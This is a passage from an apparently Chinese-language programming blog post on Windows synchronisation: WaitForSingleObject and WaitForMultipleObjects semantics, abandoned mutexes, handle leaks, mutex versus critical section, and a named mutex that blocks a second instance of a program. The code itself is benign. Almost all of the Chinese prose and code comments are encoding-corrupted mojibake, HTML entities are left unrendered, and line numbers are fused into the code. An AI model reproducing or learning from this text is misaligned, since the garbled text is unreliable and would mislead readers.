è®¿é—®ä¸´ç•Œèµ„æº ***/ReleaseMutex(hMutex); // é‡Šæ”¾æ‰€æœ‰æƒï¼Œä¸é‡Šæ”¾çš„è¯å…¶ä»–çº¿ç¨‹ä¼šé˜»å¡åœ¨ç­‰å¾…å‡½æ•°ï¼Œå› ä¸ºè¯·æ±‚ä¸åˆ°mutex objectçš„æ‰€æœ‰æƒCloseHandle(hMutex); // mutex objectä¹Ÿæ˜¯å†…æ ¸å¯¹è±¡ï¼Œå…³é—­å¥æŸ„ WaitForSingleObjectå†ç†è§£ å‰è¨€ åœ¨å‰é¢åˆ›å»ºçº¿ç¨‹çš„ç« èŠ‚ï¼Œåˆ›å»ºçº¿ç¨‹åWaitForSingleObject(hThread, INFINITE);ï¼Œè¿™é‡Œçš„WaitForSingleObjectå°±æ˜¯åœ¨ç­‰çº¿ç¨‹å‡½æ•°æ‰§è¡Œå®Œï¼›ç„¶ååœ¨è¿™ç¯‡äº’æ–¥ä½“çš„å†…å®¹ä¸­ï¼Œåˆ›å»º/è·å–äº’æ–¥å¯¹è±¡åè°ƒç”¨WaitForSingleObject(hMutex, INFINITE);ï¼Œè¿™é‡Œçš„WaitForSingleObjectçš„å«ä¹‰æ˜¯ç­‰å¾…å–å¾—äº’æ–¥å¯¹è±¡çš„æ‹¥æœ‰æƒã€‚ç„¶åçœ‹MSDNä¸Šå¯¹WaitForSingleObjectçš„æè¿°æ˜¯Waits until the specified object is in the signaled state or the time-out interval elapses.æ€ä¹ˆå°†å¯¹äºä¸åŒå†…æ ¸å¯¹è±¡ç»Ÿä¸€èµ·æ¥ç†è§£å‘¢ï¼Ÿ å›ç­” WaitForSingleObject åœ¨Windowsç¼–ç¨‹ä¸­ç¡®å®æ˜¯ä¸€ä¸ªå¤šç”¨é€”çš„åŒæ­¥æœºåˆ¶ï¼Œå®ƒçš„è¡Œä¸ºå–å†³äºä¼ é€’ç»™å®ƒçš„å¯¹è±¡ç±»å‹ã€‚ä¸ºäº†ç»Ÿä¸€è§£é‡Šè¿™ä¸ªå‡½æ•°çš„è¡Œä¸ºï¼Œå¯ä»¥å…³æ³¨å®ƒçš„æ ¸å¿ƒåŠŸèƒ½ï¼šâ€œç­‰å¾…ç›´åˆ°æŒ‡å®šå¯¹è±¡è¿›å…¥å·²é€šçŸ¥çŠ¶æ€æˆ–è¶…æ—¶é—´éš”ç»“æŸâ€ã€‚ è¿™ä¸ªâ€œå·²é€šçŸ¥çŠ¶æ€ï¼ˆsignaled stateï¼‰â€çš„å«ä¹‰ä¼šæ ¹æ®ä¼ é€’ç»™ WaitForSingleObject çš„å¯¹è±¡ç±»å‹è€Œå˜åŒ–ï¼š å½“ä¼ é€’çº¿ç¨‹å¥æŸ„ï¼ˆhThreadï¼‰æ—¶ï¼šè¿™é‡Œçš„â€œå·²é€šçŸ¥çŠ¶æ€â€æ„å‘³ç€çº¿ç¨‹å·²ç»å®Œæˆäº†å®ƒçš„æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒWaitForSingleObject ç­‰å¾…ç›®æ ‡çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚å½“çº¿ç¨‹ç»“æŸæ—¶ï¼Œå®ƒçš„çŠ¶æ€å˜ä¸ºâ€œå·²é€šçŸ¥â€ï¼Œæ­¤æ—¶ WaitForSingleObject åœæ­¢é˜»å¡ï¼Œè°ƒç”¨çº¿ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œã€‚ å½“ä¼ é€’äº’æ–¥å¯¹è±¡ï¼ˆmutex objectï¼‰æ—¶ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œâ€œå·²é€šçŸ¥çŠ¶æ€â€æŒ‡çš„æ˜¯äº’æ–¥å¯¹è±¡å˜å¾—å¯ç”¨ï¼ˆå³æ²¡æœ‰è¢«å…¶ä»–çº¿ç¨‹æ‹¥æœ‰ï¼‰ã€‚WaitForSingleObject åœ¨è¿™é‡Œç”¨äºç­‰å¾…è·å–äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒã€‚å¦‚æœäº’æ–¥å¯¹è±¡å·²è¢«å…¶ä»–çº¿ç¨‹å ç”¨ï¼Œè°ƒç”¨çº¿ç¨‹å°†ä¼šé˜»å¡ï¼Œç›´åˆ°äº’æ–¥å¯¹è±¡è¢«é‡Šæ”¾å¹¶å˜ä¸ºâ€œå·²é€šçŸ¥â€çŠ¶æ€ï¼Œæ­¤æ—¶è°ƒç”¨çº¿ç¨‹è·å–å…¶æ‰€æœ‰æƒã€‚ å› æ­¤ï¼ŒWaitForSingleObject çš„æ ¸å¿ƒåŠŸèƒ½æ˜¯ç­‰å¾…ï¼Œä½†â€œç­‰å¾…ä»€ä¹ˆâ€å–å†³äºå®ƒæ‰€ç­‰å¾…çš„å¯¹è±¡ç±»å‹ã€‚æ— è®ºæ˜¯ç­‰å¾…çº¿ç¨‹ç»“æŸè¿˜æ˜¯ç­‰å¾…è·å–äº’æ–¥å¯¹è±¡çš„æ‰€æœ‰æƒï¼Œéƒ½æ˜¯åŸºäºåŒä¸€ä¸ªåŸºæœ¬åŸç†ï¼šç­‰å¾…ä¸€ä¸ªå¯¹è±¡ä»â€œéé€šçŸ¥çŠ¶æ€ï¼ˆnonsignaled stateï¼‰â€å˜ä¸ºâ€œå·²é€šçŸ¥çŠ¶æ€ï¼ˆsignaled stateï¼‰â€ã€‚è¿™ä¸ªç­‰å¾…è¿‡ç¨‹å¯èƒ½ä¼šå› ä¸ºè¶…æ—¶è€Œç»“æŸï¼Œå¦‚æœæŒ‡å®šäº†è¶…æ—¶æ—¶é—´çš„è¯ã€‚ å†…æ ¸å¯¹è±¡è¿™ç§çŠ¶æ€çš„åˆ‡æ¢æ˜¯ç”±Microsoftä¸ºæ¯ä¸ªå¯¹è±¡å»ºç«‹çš„ä¸€å¥—è§„åˆ™æ¥å†³å®šçš„ï¼Œåœ¨å†…æ ¸ä¸­å…¶å®å°±æ˜¯ä¸ªBOOLå€¼ï¼Œnonsignaled stateä¸ºFALSEï¼Œsignaled stateä¸ºTRUE ä¸Šé¢çš„å‰è¨€å’Œå›ç­”æ˜¯æœ€æ—©çš„ç†è§£ï¼Œç°åœ¨ç†è§£æœ‰æ›´æ–°ï¼Œå†…å®¹å¦‚ä¸‹ WaitForSingleObjectçš„ä½œç”¨æ˜¯ç­‰å¾…ä¸€ä¸ªå†…æ ¸å¯¹è±¡ï¼ˆMSDNä¸Šå¯ä»¥çœ‹åˆ°å¯ä»¥ç­‰å“ªäº›å†…æ ¸å¯¹è±¡ï¼‰ï¼Œä¸åŒçš„å†…æ ¸å¯¹è±¡ï¼Œè¿™ä¸ªç­‰å¾…çš„å«ä¹‰æ˜¯ä¸ä¸€æ ·çš„ã€‚æˆ‘ä»¬è¦å…³æ³¨ï¼š ç­‰å¾…çš„å«ä¹‰ æ˜¯å¦ä¼šä¿®æ”¹åˆ°ç­‰å¾…å†…æ ¸å¯¹è±¡çš„çŠ¶æ€ å¯ä»¥è¢«ç­‰å¾…çš„å¯¹è±¡ ç­‰å¾…å¯¹è±¡æˆåŠŸçš„å«ä¹‰ æ˜¯å¦ä¼šä¿®æ”¹åˆ°ç­‰å¾…å†…æ ¸å¯¹è±¡çš„çŠ¶æ€ çº¿ç¨‹ (Thread) ç­‰å¾…çº¿ç¨‹ç»“æŸ ä¸ä¼šï¼Œçº¿ç¨‹ç»“æŸåçŠ¶æ€è‡ªç„¶å˜åŒ– è¿›ç¨‹ (Process) ç­‰å¾…è¿›ç¨‹ç»“æŸ ä¸ä¼šï¼Œè¿›ç¨‹ç»“æŸåçŠ¶æ€è‡ªç„¶å˜åŒ– äº‹ä»¶ (Event) ç­‰å¾… Event æœ‰ä¿¡å· å¦‚æœæ˜¯è‡ªåŠ¨é‡ç½®äº‹ä»¶ï¼Œç­‰å¾…å‡½æ•°è¿”å›æ—¶ï¼ŒçŠ¶æ€å°†è‡ªåŠ¨é‡ç½®ä¸ºæ— ä¿¡å·å¦‚æœæ˜¯æ‰‹åŠ¨é‡ç½®äº‹ä»¶ï¼ŒçŠ¶æ€ä¸ä¼šè‡ªåŠ¨æ”¹å˜ï¼Œéœ€è¦æ‰‹åŠ¨é‡ç½® äº’æ–¥ä½“ (Mutex) ç­‰å¾…æŒæœ‰ Mutex çš„çº¿ç¨‹é‡Šæ”¾è¯¥ Mutexï¼Œç­‰å¾…æˆåŠŸåæ‹¥æœ‰è¯¥ Mutex ä¼šï¼Œè°ƒç”¨çº¿ç¨‹è·å– Mutex åå…¶çŠ¶æ€å˜ä¸ºæ— ä¿¡å· ä¿¡å·é‡ (Semaphore) ç­‰å¾…è¯¥ Semaphore å¯¹è±¡æœ‰ä¿¡å· ä¼šï¼Œè°ƒç”¨ WaitForSingleObject ä¼šä½¿ä¿¡å·é‡çš„è®¡æ•°å‡ä¸€ çº¿ç¨‹ (Thread)ï¼šç­‰å¾…çº¿ç¨‹å¯¹è±¡æ—¶ï¼Œæ„å‘³ç€ç­‰å¾…æŒ‡å®šçš„çº¿ç¨‹æ‰§è¡Œç»“æŸã€‚çº¿ç¨‹çš„çŠ¶æ€åœ¨å…¶è‡ªç„¶ç»“æŸæ—¶å˜åŒ–ï¼Œä¸æ˜¯ç”±ç­‰å¾…æ“ä½œå¼•èµ·çš„ã€‚ è¿›ç¨‹ (Process)ï¼šç±»ä¼¼äºçº¿ç¨‹ï¼Œç­‰å¾…è¿›ç¨‹å¯¹è±¡æ„å‘³ç€ç­‰å¾…è¯¥è¿›ç¨‹ç»“æŸè¿è¡Œã€‚è¿›ç¨‹çŠ¶æ€çš„æ”¹å˜æ˜¯ç”±äºè¿›ç¨‹çš„ç»“æŸï¼Œè€Œéç­‰å¾…æ“ä½œã€‚ äº‹ä»¶ (Event)ï¼šäº‹ä»¶å¯¹è±¡å¯ä»¥é…ç½®ä¸ºè‡ªåŠ¨é‡ç½®æˆ–æ‰‹åŠ¨é‡ç½®ã€‚ å¦‚æœæ˜¯è‡ªåŠ¨é‡ç½®äº‹ä»¶ï¼Œå½“ç­‰å¾…å‡½æ•°è¿”å›æ—¶ï¼Œç³»ç»Ÿè‡ªåŠ¨å°†äº‹ä»¶çŠ¶æ€è®¾ç½®å›æ— ä¿¡å·çŠ¶æ€ï¼› å¦‚æœæ˜¯æ‰‹åŠ¨é‡ç½®ï¼Œåˆ™çŠ¶æ€ä¸ä¼šè‡ªåŠ¨æ”¹å˜ï¼Œéœ€è¦æ‰‹åŠ¨é‡ç½®ã€‚ äº’æ–¥ä½“ (Mutex)ï¼šç­‰å¾…äº’æ–¥ä½“å¯¹è±¡æˆåŠŸæ„å‘³ç€å½“å‰çº¿ç¨‹è·å–äº†è¯¥äº’æ–¥ä½“çš„æ‰€æœ‰æƒã€‚åœ¨æ­¤ä¹‹åï¼Œäº’æ–¥ä½“çš„çŠ¶æ€å˜ä¸ºæ— ä¿¡å·ï¼Œè¡¨ç¤ºå®ƒè¢«å½“å‰çº¿ç¨‹æŒæœ‰ï¼Œç›´è‡³è¯¥çº¿ç¨‹é‡Šæ”¾äº’æ–¥ä½“ã€‚ ä¿¡å·é‡ (Semaphore)ï¼šä¿¡å·é‡çš„ç­‰å¾…æ¶‰åŠä¿¡å·é‡çš„è®¡æ•°ã€‚å½“ WaitForSingleObject æˆåŠŸè¿”å›æ—¶ï¼Œè¡¨ç¤ºçº¿ç¨‹å·²ç»æ¶ˆè€—äº†ä¸€ä¸ªä¿¡å·é‡å•ä½ï¼Œä¿¡å·é‡çš„è®¡æ•°ç›¸åº”å‡å°‘ã€‚ å‚è€ƒï¼š3.6 Windows çº¿ç¨‹èµ„æºåŒæ­¥å¯¹è±¡ ç»éªŒä¹‹è°ˆ å†™ä»£ç é€»è¾‘å¤æ‚æ—¶å¯èƒ½ä¼šå‡ºç°è¿ç»­ä½¿ç”¨WaitForSingleObjectçš„æƒ…å†µï¼Œæ­¤æ—¶è¦æ³¨æ„è¿™ä¸ªç­‰å¾…æ˜¯å¦ä¼šæ”¹å˜ç­‰å¾…å†…æ ¸å¯¹è±¡çš„çŠ¶æ€ ç­‰å¾…ä¸€ä¸ªçº¿ç¨‹å†…æ ¸å¯¹è±¡12345// åˆ›å»ºä¸€ä¸ªçº¿ç¨‹hThread = CreateThread(NULL, 0, ThreadProc, &amp;threadId1, 0, NULL);WaitForSingleObject(hThread, INFINITE); // ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæ¯•WaitForSingleObject(hThread, INFINITE); // ç«‹å³è¿”å›ï¼Œå› ä¸ºçº¿ç¨‹å·²ç»“æŸWaitForSingleObject(hThread, INFINITE); // ç«‹å³è¿”å›ï¼Œå› ä¸ºçº¿ç¨‹å·²ç»“æŸ ç¬¬ä¸€ä¸ª WaitForSingleObject(hThread, INFINITE) ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚ åç»­çš„ WaitForSingleObject(hThread, INFINITE) è°ƒç”¨ä¼šç«‹å³è¿”å›ï¼Œå› ä¸ºçº¿ç¨‹å·²ç»å¤„äºç»ˆæ­¢çŠ¶æ€ï¼Œè¿™ç§çŠ¶æ€æ˜¯æ°¸ä¹…çš„ã€‚ ç­‰å¾…ä¸€ä¸ªMutexå†…æ ¸å¯¹è±¡12345678// åˆ›å»ºä¸€ä¸ªäº’æ–¥ä½“HANDLE hMutex = CreateMutex(NULL, FALSE, NULL); // ä¸è¢«åˆ›å»ºè€…æ‹¥æœ‰WaitForSingleObject(hMutex, INFINITE); // å¾—åˆ°Mutexï¼Œä¼šå°†Mutexä¿®æ”¹ä¸ºæ— ä¿¡å·//ReleaseMutex(hMutex); // é‡Šæ”¾Mutexï¼Œå°†å…¶çŠ¶æ€æ”¹ä¸ºæœ‰ä¿¡å·WaitForSingleObject(hMutex, INFINITE); // å†æ¬¡é˜»å¡ï¼Œç›´åˆ°Mutexè¢«é‡Šæ”¾å˜ä¸ºæœ‰ä¿¡å·//ReleaseMutex(hMutex); // é‡Šæ”¾Mutexï¼Œå…è®¸å…¶ä»–ç­‰å¾…çš„çº¿ç¨‹ç»§ç»­æ‰§è¡ŒWaitForSingleObject(hMutex, INFINITE); // å†æ¬¡é˜»å¡ï¼Œç­‰å¾…Mutexå˜ä¸ºæœ‰ä¿¡å·//ReleaseMutex(hMutex); // æœ€ç»ˆé‡Šæ”¾Mutex ç¬¬ä¸€ä¸ª WaitForSingleObject(hMutex, INFINITE) å°è¯•è·å–äº’æ–¥ä½“ï¼Œå¦‚æœè·å–æˆåŠŸï¼Œä¼šå°†äº’æ–¥ä½“çŠ¶æ€è®¾ä¸ºæ— ä¿¡å·ï¼Œè¡¨ç¤ºå®ƒè¢«å½“å‰çº¿ç¨‹æŒæœ‰ã€‚ å¿…é¡»è°ƒç”¨ ReleaseMutex(hMutex) æ¥é‡Šæ”¾äº’æ–¥ä½“ï¼Œä¹‹åäº’æ–¥ä½“çŠ¶æ€å˜å›æœ‰ä¿¡å·ï¼Œå…¶ä»–çº¿ç¨‹ï¼ˆæˆ–å½“å‰çº¿ç¨‹å†æ¬¡è°ƒç”¨ï¼‰æ‰å¯ä»¥å†æ¬¡è·å–å®ƒã€‚ å¦‚æœæ²¡æœ‰é‡Šæ”¾äº’æ–¥ä½“ï¼Œä»»ä½•åç»­çš„ WaitForSingleObject è°ƒç”¨éƒ½ä¼šé˜»å¡ï¼Œç›´åˆ°äº’æ–¥ä½“è¢«é‡Šæ”¾ã€‚ WaitForSingleObjectè¿”å›å€¼ å‡½æ•°è°ƒç”¨æˆåŠŸï¼š WAIT_OBJECT_0ï¼Œè¡¨ç¤ºæˆåŠŸâ€œç­‰å¾…â€åˆ°è®¾ç½®çš„å¯¹è±¡ WAIT_TIMEOUTï¼Œç­‰å¾…è¶…æ—¶ WAIT_ABANDONEDï¼Œå½“ç­‰å¾…çš„å¯¹è±¡æ˜¯Mutexç±»å‹æ—¶ï¼Œå¦‚æœæŒæœ‰è¯¥Mutexå¯¹è±¡çš„çº¿ç¨‹å·²ç»ç»“æŸï¼Œä½†æ˜¯æ²¡æœ‰åœ¨ç»“æŸå‰é‡Šæ”¾è¯¥Mutexï¼Œæ­¤æ—¶è¯¥Mutexå·²ç»å¤„äºåºŸå¼ƒçŠ¶æ€ï¼Œå…¶è¡Œä¸ºæ˜¯æœªçŸ¥çš„ï¼Œä¸å»ºè®®å†ä½¿ç”¨è¯¥Mutex å‡½æ•°è°ƒç”¨å¤±è´¥ï¼š è¿”å›å€¼ä¸ºWAIT_FAILEDï¼Œè°ƒGetLaseErrorå¾—åˆ°å…·ä½“é”™è¯¯ç  è·å¾—äº’æ–¥å¯¹è±¡åï¼Œè¿›å…¥ä¸´ç•ŒåŒºï¼Œåœ¨ä¸´ç•ŒåŒºä¸­æ„å¤–é€€å‡ºï¼Œæ²¡åŠæ—¶é‡Šæ”¾äº’æ–¥å¯¹è±¡ï¼Œå…¶ä»–å¤„äºç­‰å¾…è¯·æ±‚è¯¥äº’æ–¥å¯¹è±¡çš„çº¿ç¨‹èƒ½å¾—åˆ°è¿™ä¸ªäº’æ–¥å¯¹è±¡ï¼ŒWaitForSingleObjectè¿”å›å€¼ä¸ºWAIT_ABANDONEDã€‚ ç¨‹åºB123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; HANDLE hMutex = CreateMutex(NULL, FALSE, &quot;Mutex&quot;); if (hMutex == NULL) &#123; printf(&quot;CreateMutex error: %d &quot;, GetLastError()); return 1; &#125; getchar(); // ä¿æŒç­‰å¾… printf(&quot;è¾“å…¥ä»»æ„é”®ç»§ç»­ &quot;); DWORD waitResult = WaitForSingleObject(hMutex, INFINITE); switch (waitResult) &#123; case WAIT_ABANDONED: // å¤„ç†é—å¼ƒçš„äº’æ–¥å¯¹è±¡çš„æƒ…å†µ printf(&quot;Mutex was abandoned. &quot;); break; case WAIT_OBJECT_0: // è®¿é—®å—äº’æ–¥å¯¹è±¡ä¿æŠ¤çš„èµ„æº printf(&quot;Mutex acquired. &quot;); printf(&quot;Ready to call ExitProcess. &quot;); ExitProcess(0); // æ¨¡æ‹Ÿæ„å¤–é€€å‡º break; default: printf(&quot;Wait error: %d &quot;, GetLastError()); return 1; &#125; getchar(); // é˜²æ­¢æ§åˆ¶å°é€€å‡º // ... if (!ReleaseMutex(hMutex)) &#123; printf(&quot;Error releasing mutex: %d &quot;, GetLastError()); &#125; CloseHandle(hMutex); return 0;&#125; èµ·æ¥ä¸¤ä¸ªcmdï¼Œéƒ½è¿è¡Œè¿™ä¸ªTestBç¨‹åºï¼Œéƒ½ä¼šå¡åœ¨ç¬¬13è¡Œçš„getchar()ï¼Œæ­¤æ—¶æŸä¸ªè¿›ç¨‹å·²åˆ›å»ºäº†&quot;Mutex&quot;äº’æ–¥å¯¹è±¡ï¼Œå¦å¤–ä¸€ä¸ªç›¸å½“äºæ‰“å¼€è¿™ä¸ªäº’æ–¥å¯¹è±¡è·å¾—äº†å¥æŸ„ï¼Œä½†å®ƒä»¬éƒ½è¿˜æ²¡æ‹¥æœ‰ã€‚ 1å·cmdï¼ˆå·¦è¾¹çš„ï¼‰ï¼šæŒ‰ä¸‹å›è½¦ï¼Œæ‹¥æœ‰äº†äº’æ–¥å¯¹è±¡ï¼Œswitchèµ°WAIT_OBJECT_0ï¼Œç„¶åæ‰§è¡ŒExitProcess(0);æ„å¤–é€€å‡ºï¼Œæ²¡æ¥å¾—åŠé‡Šæ”¾äº’æ–¥å¯¹è±¡ã€‚ï¼ˆæ­¤æ—¶è¿›ç¨‹æ¶ˆäº¡äº†ï¼Œä½†å› ä¸º2å·cmdè¿˜æœ‰handleæŒ‡å‘&quot;Mutex&quot;äº’æ–¥å¯¹è±¡ï¼Œæ‰€ä»¥&quot;Mutex&quot;äº’æ–¥å¯¹è±¡è®¡æ•°å™¨ä¸ä¸º0ï¼Œæ²¡é‡Šæ”¾ 2å·cmdï¼ˆå³è¾¹çš„ï¼‰ï¼šå›è½¦ï¼Œæ‹¿åˆ°çš„äº’æ–¥å¯¹è±¡æ˜¯1å·cmdä¸­ABANDONEDçš„äº’æ–¥å¯¹è±¡ï¼Œswitchèµ°WAIT_ABANDONED WaitForMultipleObjects ç­‰å¾…å¤šä¸ªå†…æ ¸å¯¹è±¡ 123456DWORD WaitForMultipleObjects( [in] DWORD nCount, // number of handles in array å†…æ ¸å¯¹è±¡çš„æ•°é‡ [in] const HANDLE *lpHandles, // object-handle array å†…æ ¸å¯¹è±¡çš„å¥æŸ„æ•°ç»„ [in] BOOL bWaitAll, // wait option ç­‰å¾…æ¨¡å¼ [in] DWORD dwMilliseconds // time-out interval ç­‰å¾…è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰); è¿”å›å€¼ åœ¨å‚æ•°bWaitAllè®¾ç½®ä¸º FALSE çš„æƒ…å†µä¸‹ï¼ˆå³ç­‰å¾…ä»»ä¸€å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜æ›´ï¼‰ å‡½æ•°è°ƒç”¨æˆåŠŸï¼š WAIT_TIMEOUTï¼Œç­‰å¾…è¶…æ—¶ WAIT_OBJECT_0 ï½ (WAIT_OBJECT_0 + nCountâ€“ 1)**ï¼Œè¡¨ç¤ºæˆåŠŸâ€œç­‰å¾…â€åˆ°è®¾ç½®çš„å¯¹è±¡ é€šè¿‡nCountâ€“ 1å¯ä»¥çŸ¥é“æ˜¯ç­‰å¾…å¯¹è±¡æ•°ç»„ä¸­å“ªä¸ªå¯¹è±¡çŠ¶æ€å‘ç”Ÿäº†æ”¹å˜ ä¸¾ä¸ªä¾‹å­ï¼Œå‡è®¾ç°åœ¨ç­‰å¾…ä¸‰ä¸ªå¯¹è±¡A1ã€A2ã€A3ï¼Œå®ƒä»¬åœ¨æ•°ç»„lpHandlesä¸­çš„ä¸‹æ ‡ä¾æ¬¡æ˜¯0ã€1ã€2ï¼ŒæŸæ¬¡WaitForMultipleObjectsè¿”å›å€¼æ˜¯ Wait_OBJECT_0 + 1ï¼Œåˆ™è¡¨ç¤ºå¯¹è±¡A2æœ‰ä¿¡å·ï¼Œå¯¼è‡´WaitForMultipleObjectsè°ƒç”¨æˆåŠŸè¿”å›ã€‚ 123456789101112131415161718192021222324HANDLE waitHandles[3];waitHandles[0] = hA1Handle;waitHandles[1] = hA2Handle;waitHandles[2] = hA3Handle;DWORD dwResult = WaitForMultipleObjects(3, waitHandles, FALSE, 3000);switch(dwResult)&#123; case WAIT_OBJECT_0 + 0: //A1 æœ‰ä¿¡å· break; case WAIT_OBJECT_0 + 1: //A2 æœ‰ä¿¡å· break; case WAIT_OBJECT_0 + 2: //A3 æœ‰ä¿¡å· break; default: //å‡ºé”™æˆ–è¶…æ—¶ break;&#125; WAIT_ABANDONED_0 ï½ (WAIT_ABANDONED_0 + nCountâ€“ 1)ï¼Œå½“ç­‰å¾…çš„å¯¹è±¡æ˜¯Mutexç±»å‹æ—¶ï¼Œå¦‚æœæŒæœ‰è¯¥Mutexå¯¹è±¡çš„çº¿ç¨‹å·²ç»ç»“æŸï¼Œä½†æ˜¯æ²¡æœ‰åœ¨ç»“æŸå‰é‡Šæ”¾è¯¥Mutexï¼Œæ­¤æ—¶è¯¥Mutexå·²ç»å¤„äºåºŸå¼ƒçŠ¶æ€ï¼Œå…¶è¡Œä¸ºæ˜¯æœªçŸ¥çš„ï¼Œä¸å»ºè®®å†ä½¿ç”¨è¯¥Mutexã€‚ é€šè¿‡nCount - 1å¯ä»¥çŸ¥é“æ˜¯ç­‰å¾…å¯¹è±¡æ•°ç»„ä¸­å“ªä¸ªå¯¹è±¡å§‹ç»ˆæ²¡æœ‰è¢«å…¶ä»–çº¿ç¨‹é‡Šæ”¾ä½¿ç”¨æƒ å‡½æ•°è°ƒç”¨å¤±è´¥ï¼š è¿”å›å€¼ä¸ºWAIT_FAILEDï¼Œè°ƒGetLaseErrorå¾—åˆ°å…·ä½“é”™è¯¯ç  å†…æ ¸èµ„æºæ³„éœ² å†…æ ¸å¯¹è±¡æ³„éœ²çš„é—®é¢˜åªå­˜åœ¨äºç¨‹åºè¿è¡Œæ—¶ï¼Œç¨‹åºç»“æŸäº†ï¼ˆæ— è®ºæ˜¯æ­£å¸¸ç»“æŸè¿˜æ˜¯å¼‚å¸¸é€€å‡ºï¼‰ï¼ŒWindowséƒ½ä¼šä¿è¯å†…æ ¸å¯¹è±¡çš„æ¸…ç†é‡Šæ”¾ã€‚å¦‚æœä¸€ä¸ªç¨‹åºä¸€ç›´å†è¿è¡Œï¼Œæ²¡æœ‰CloseHandleè®¡æ•°å™¨ï¼Œå†…æ ¸å¯¹è±¡å°±ä¼šä¸€ç›´å ç”¨ç©ºé—´ï¼ˆé«˜2Gï¼‰ï¼Œå°±ä¼šå¯¼è‡´èµ„æºæ³„éœ²ï¼ˆleakï¼‰ã€‚ æ¯”å¦‚C++æœåŠ¡ç«¯å¼€å‘ï¼Œå †å†…å­˜æ²¡æœ‰åŠæ—¶é‡Šæ”¾ï¼Œè¿™ä¸ªæœåŠ¡å™¨è¿è¡Œæ—¶é—´é•¿äº†å°±ä¼šå´©æ‰ é˜²æ­¢å†…æ ¸å¯¹è±¡æ³„éœ²çš„å¸¸è§ä»£ç ï¼šWaitForMultipleObjectsç­‰å¾…å…¨éƒ¨å—ä¿¡ï¼Œåé¢çš„ä»£ç ç´§æ¥ç€å°±æ˜¯CloseHandle 1234567// ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸWaitForMultipleObjects(4, threads, TRUE, INFINITE);// å…³é—­çº¿ç¨‹å¥æŸ„for (i = 0; i &lt; 4; i++)&#123; CloseHandle(threads[i]);&#125; äº’æ–¥ä½“VSä¸´ç•ŒåŒºé” éƒ½æ˜¯è¯·æ±‚ä»¤ç‰Œï¼Œæ²¡ä»¤ç‰Œå°±ç­‰å¾…ï¼Œåªæœ‰æ‹¿åˆ°ä»¤ç‰Œæ‰èƒ½è®¿é—®ä¸´ç•Œèµ„æºï¼Œè®¿é—®å®Œäº†è¦å½’è¿˜ä»¤ç‰Œã€‚ 123456789101112131415CRITICAL_SECTION cs;void main()&#123; //åˆå§‹åŒ–ä¸´ç•ŒåŒºèµ„æº InitializeCriticalSection(&amp;cs); //è¿›å…¥ä¸´ç•ŒåŒº EnterCriticalSection(&amp;cs); /***ä¸´ç•ŒåŒº***/ //ç¦»å¼€ä¸´ç•ŒåŒº LeaveCriticalSection(&amp;cs); //åˆ é™¤ä¸´ç•ŒåŒºèµ„æº DeleteCriticalSection(&amp;cs); &#125; 1234567891011121314// åˆ›å»ºäº’æ–¥ä½“HANDLE hMutex = CreateMutex(NULL, FALSE, &quot;XYZ&quot;); // è·å–ä»¤ç‰Œ WaitForSingleObject(hMutex, INFINITE); /***ä¸´ç•ŒåŒº***/// é‡Šæ”¾ä»¤ç‰Œ ReleaseMutex(hMutex); // å…³é—­å¥æŸ„CloseHandle(hMutex); ä¸´ç•ŒåŒºé”åªèƒ½ç”¨äºå•ä¸ªè¿›ç¨‹é—´çš„çº¿ç¨‹æ§åˆ¶ äº’æ–¥ä½“å¯ä»¥è®¾å®šç­‰å¾…è¶…æ—¶ï¼Œä½†ä¸´ç•ŒåŒºé”ä¸èƒ½ é€šè¿‡WaitForSingleObjectè®¾ç½®ç­‰å¾…æ—¶é—´ çº¿ç¨‹æ„å¤–ç»“æŸæ—¶ï¼Œäº’æ–¥ä½“å¯ä»¥é¿å…æ— é™ç­‰å¾…ï¼Œè€Œä¸´ç•ŒåŒºé”ä¸èƒ½ äº’æ–¥ä½“æ•ˆç‡æ²¡æœ‰çº¿ç¨‹é”é«˜ å› ä¸ºæ˜¯äº’æ–¥ä½“æ˜¯å†…æ ¸å¯¹è±¡ï¼Œè€Œä¸´ç•ŒåŒºé”æ˜¯è¿›ç¨‹ä¸­çš„ äº’æ–¥ä½“åº”ç”¨ä¹‹ä¸€-é˜²ç¨‹åºå¤šå¼€ é˜²ç¨‹åºå¤šå¼€æœ‰å¾ˆå¤šç§æ–¹å¼ï¼Œäº’æ–¥ä½“åªæ˜¯å…¶ä¸­çš„ä¸€ç§ã€‚äº’æ–¥ä½“ç”¨äºé˜²æ­¢ä¸€ä¸ªç¨‹åºå¤šå¼€æ˜¯åˆ©ç”¨äº†è¿™äº›ç‰¹ç‚¹ï¼š mutex objectæ˜¯å†…æ ¸å¯¹è±¡ï¼Œå¯ä»¥è¢«å¤šè¿›ç¨‹è®¿é—®åˆ° å¦‚æœmutex objectå·²å­˜åœ¨ï¼ŒCreateMutexè°ƒç”¨å…¶å®æ˜¯æ‰“å¼€ä¸€ä¸ªå·²å­˜åœ¨çš„äº’æ–¥å¯¹è±¡ã€‚GetLaseErrorè·å¾—çš„è¿”å›å€¼æ˜¯ERROR_ALREADY_EXISTS è¿™ä¸ªmutex objectæ˜¯ç¬¬ä¸€æ¬¡åˆ›å»ºï¼Œè¿”å›å€¼ä¸ºè¿™ä¸ªäº’æ–¥å¯¹è±¡çš„handle 123456789101112131415161718192021222324252627282930313233#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // åˆ›å»ºä¸€ä¸ªåä¸ºMyUniqueProgramMutexçš„äº’æ–¥å¯¹è±¡ HANDLE hMutex = CreateMutex(NULL, FALSE, &quot;MyUniqueProgramMutex&quot;); // åˆ¤æ–­äº’æ–¥ä½“åˆ›å»ºæˆåŠŸorå¤±è´¥ if (hMutex == NULL) &#123; printf(&quot;CreateMutex error: %d &quot;, GetLastError()); return 1; &#125; // å…ˆå‰æ˜¯å¦å·²åˆ›å»ºè¿‡è¿™ä¸ªmute object if (GetLastError() == ERROR_ALREADY_EXISTS) &#123; 